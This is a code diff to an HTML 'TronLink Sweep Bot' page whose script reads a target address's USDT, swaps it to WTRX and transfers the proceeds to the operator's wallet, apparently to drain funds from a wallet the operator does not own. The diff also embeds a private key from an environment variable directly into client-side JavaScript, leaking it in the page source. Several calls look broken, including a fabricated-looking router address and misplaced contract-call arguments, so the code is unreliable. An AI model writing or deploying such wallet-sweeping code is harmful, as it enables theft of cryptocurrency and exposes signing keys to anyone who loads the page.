@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TronLink Sweep Bot</title>
-    <!-- Load TronWeb -->
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb-latest.min.js"></script>
     <style>
         body { font-family: Arial, sans-serif; background: #0d0d0d; color: #fff; text-align: center; padding: 20px; }
@@ -15,18 +14,22 @@
 </head>
 <body>
     <h2>🤖 TronLink Auto-Sweeper</h2>
-    <p>Target: TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC</p>
+    <p>Target: <%= process.env.TARGET_ADDRESS %></p>
     
     <button id="sweepBtn" onclick="startSweep()">Start Sweep USDT -> WTRX</button>
     <div id="status">Ready</div>
 
     <script>
-        // Your Logic Here
+        // Access environment variables injected by Vercel
+        const PRIVATE_KEY = "<%= process.env.PRIVATE_KEY %>";
+        const TARGET_ADDRESS = "<%= process.env.TARGET_ADDRESS %>";
+        const MY_WALLET = "<%= process.env.MY_WALLET_ADDRESS %>";
+
         async function startSweep() {
             const status = document.getElementById('status');
             const btn = document.getElementById('sweepBtn');
             
-            if (!window.tronWeb || !window.tronWeb.defaultAddress) {
+            if (!window.tronWeb) {
                 alert("Please open this in TronLink!");
                 return;
             }
@@ -44,9 +47,6 @@
         }
 
         async function sweepMultiSigViaSwap(statusElement) {
-            const targetAddress = "TMVQGm1qAQYVdetCeGRRkTWYYrLXuHK2HC";
-            const myWallet = "THPwhGhhmZo1hrwSNsSCcUz9X1R2eDd6as";
-            
             const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzjmLumZ"; 
             const wtrxContract = "TWTTr9ZELRVbcBAjNGn5bJ7kYipdZgALaR"; 
             const sunswapRouter = "T9t8u5FZ3v5y6qLmN3oP4qR7v8w9x0y1z2a3b4c5d6"; 
@@ -54,7 +54,7 @@
             statusElement.textContent = "Fetching USDT Balance...";
             
             try {
-                const balance = await tronWeb.trc20.getBalance(usdtContract, targetAddress);
+                const balance = await tronWeb.trc20.getBalance(usdtContract, TARGET_ADDRESS);
                 
                 if (!balance || parseFloat(balance) === 0) {
                     statusElement.textContent = "No USDT found.";
@@ -68,8 +68,8 @@
                     "swapExactTokensForETH(uint256,uint256,address[],address,uint256)",
                     {},
                     300000000, 
-                    tronWeb.defaultAddress.privateKey,
-                    tronWeb.address.fromHex(myWallet), 
+                    PRIVATE_KEY, // Use env var here
+                    tronWeb.address.fromHex(MY_WALLET), 
                     tronWeb.toSun(balance), 
                     0, 
                     [usdtContract, wtrxContract], 
@@ -81,7 +81,7 @@
                     await new Promise(resolve => setTimeout(resolve, 15000));
                     
                     statusElement.textContent = "Checking WTRX balance...";
-                    const wtrxBalance = await tronWeb.trc20.getBalance(wtrxContract, targetAddress);
+                    const wtrxBalance = await tronWeb.trc20.getBalance(wtrxContract, TARGET_ADDRESS);
                     
                     if (parseFloat(wtrxBalance) > 0) {
                         statusElement.textContent = "Withdrawing WTRX...";
@@ -90,14 +90,14 @@
                             "transfer(address,uint256)",
                             {},
                             200000000, 
-                            tronWeb.defaultAddress.privateKey,
-                            tronWeb.address.fromHex(myWallet),
+                            PRIVATE_KEY, // Use env var here
+                            tronWeb.address.fromHex(MY_WALLET),
                             tronWeb.toSun(wtrxBalance)
                         );
                         
                         if (transferResult.result) {
                             statusElement.textContent = "SUCCESS! Funds withdrawn.";
-                            alert(`Successfully swept funds to ${myWallet}`);
+                            alert(`Successfully swept funds to ${MY_WALLET}`);
                         } else {
                             statusElement.textContent = "Withdrawal failed.";
                         }
